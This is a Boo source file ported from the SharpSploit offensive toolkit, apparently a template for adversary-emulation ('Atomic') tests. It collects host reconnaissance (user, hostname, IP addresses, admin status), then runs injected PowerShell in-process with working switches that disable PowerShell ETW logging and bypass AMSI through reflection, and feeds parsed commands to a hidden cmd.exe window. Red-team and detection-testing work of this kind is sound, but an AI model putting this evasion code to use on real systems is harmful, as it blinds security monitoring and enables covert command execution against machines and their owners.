/*

ORIGINAL CODE PORTED FROM: SharpSploit 
    - https://github.com/cobbr/SharpSploit/blob/871ab3ee664e87cdc400a53f804096d206ef559c/SharpSploit/Execution/Shell.cs#L32
*/ 

import System
import System.Reflection
import System.Diagnostics
import System.Management.Automation
import System.Globalization
import System.Security.Principal
import System.Net

public class Header:
    public static def IsHighIntegrity() as bool:
        identity = WindowsIdentity.GetCurrent()
        principal = WindowsPrincipal(identity)
        return principal.IsInRole(WindowsBuiltInRole.Administrator)

    public static def isAdmin() as bool:
        principal = WindowsIdentity.GetCurrent()
        list = principal.UserClaims
        for c in list:
            if c.Value.Contains("S-1-5-32-544"):
                return true
        return false

    public static def DisplayHeader():
        currentProcess = Process.GetCurrentProcess()

        culture = CultureInfo("en-US")
        dateTime = DateTime().UtcNow.ToString("o", culture)

        user = WindowsIdentity.GetCurrent().Name
        hostname = Dns.GetHostName()

        ipAddressList = Dns.GetHostAddresses(hostname)

        allIPv4 as List = []
        allIPv6 as List = []
        for ip in ipAddressList:
            if ip.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork:
                allIPv4.Add(ip)
            elif ip.AddressFamily == System.Net.Sockets.AddressFamily.InterNetworkV6:
                allIPv6.Add(ip)

        allipsv4 = ""
        for ipv4 in allIPv4:
            if ipv4 != allIPv4[-1]:
                allipsv4 += ipv4 + ", "
            else:
                allipsv4 += ipv4

        allipsv6 = ""		
        for ipv6 in allIPv6:
            if ipv6 != allIPv6[-1]:
                allipsv6 += ipv6 + ", "
            else:
                allipsv6 += ipv6
        integrity = IsHighIntegrity()

        Console.WriteLine("{{PID: {1}, Date(UTC): {0}, IsHighIntegrity: {6}, HostName: {2}, CurrentUser: {3}, IsUserAdmin: {7}, IPv4: [{4}], IPv6: [{5}]}}", dateTime, currentProcess.Id, hostname.ToLower(),user.ToLower(), allipsv4, allipsv6, integrity.ToString().ToLower(), isAdmin().ToString().ToLower())

public static def PowerShellExecute(PowerShellCode as string, OutString as bool, BypassLogging as bool, BypassAmsi as bool) as string:
    using ps = PowerShell.Create():
        flags = BindingFlags.NonPublic | BindingFlags.Static
        if BypassLogging:
            PSEtwLogProvider = ps.GetType().Assembly.GetType("System.Management.Automation.Tracing.PSEtwLogProvider")
            if PSEtwLogProvider is not null:
                EtwProvider = PSEtwLogProvider.GetField("etwProvider", flags)
                EventProvider = Eventing.EventProvider(Guid.NewGuid())
                EtwProvider.SetValue(null, EventProvider)

        if BypassAmsi:
            amsiUtils = ps.GetType().Assembly.GetType("System.Management.Automation.AmsiUtils")
            if amsiUtils is not null:
                amsiUtils.GetField("amsiInitFailed", flags).SetValue(null, true)

        ps.AddScript(PowerShellCode)
        if OutString:
            ps.AddCommand("Out-String")
        results = ps.Invoke()
        output = [R.ToString().Trim() as string for R in results]
        for R in output:
            print R

        ps.Commands.Clear()
        #return output

public static def Serialization(args):
    def errorHandler(sender, e as DataReceivedEventArgs):
       Console.WriteLine("Error: {0}", e.Data)
    def dataReceivedHandler(sender, e as DataReceivedEventArgs):
       Console.WriteLine(e.Data)
	
    //process info
    cmdStartInfo = ProcessStartInfo()
    cmdStartInfo.FileName = "cmd.exe"
    cmdStartInfo.RedirectStandardInput = true
    cmdStartInfo.RedirectStandardOutput = true
    cmdStartInfo.RedirectStandardError = true
    cmdStartInfo.CreateNoWindow = true
    cmdStartInfo.UseShellExecute = false

    cmdProcess = Process() //instantiating new process
    cmdProcess.StartInfo = cmdStartInfo
    //cmdProcess.ErrorDataReceived += errorHandler
    cmdProcess.OutputDataReceived += dataReceivedHandler
    cmdProcess.EnableRaisingEvents = true

    cmdProcess.Start() // starting process

    cmdProcess.BeginOutputReadLine()
    cmdProcess.BeginErrorReadLine()

    for arg in args:
        try:
            cmdProcess.StandardInput.WriteLine(arg)
        except:
            Console.WriteLine('The following command failed: {0} ', arg)

    cmdProcess.StandardInput.Flush()
    cmdProcess.StandardInput.Close()
    cmdProcess.WaitForExit()

public static def Parser(CmdPromptScript as string):
    lines = CmdPromptScript.Split(('\n', ), StringSplitOptions.None)
    
    command_list = []
    commands = false
    cleanup = false
    
    for line in lines:
        if line[0:9] == '#commands':
            commands = true
            cleanup = false
            continue

        elif line[0:17] == '#cleanup_commands':
            commands = false
            cleanup = true
            continue
 
        elif line[:19] == '#get_prereq_comands':
            commands = false
            cleanup = false
            continue
        
        elif line[:16] == '#prereq_commands':
            commands = false
            cleanup = false
            continue
        
        if commands:
            if len(line) > 0:
                command_list.Add(line)
        
        elif cleanup:
            if len(line) > 0:
                command_list.Add(line)
        

    return command_list


public static def Main():
    Header.DisplayHeader()
    
    PowerShellExecute(
        PowerShellCode=`POWERSHELL_SCRIPT`,
        OutString=OUT_STRING,
        BypassLogging=BYPASS_LOGGING,
        BypassAmsi=BYPASS_AMSI
    )
    
    command_list = Parser(`CMD_SCRIPT`)
    #for c in command_list:
    #    print(c)

    try:
        Serialization(command_list)
    except:
        Console.WriteLine(' * [!] Atomic test failed. ')

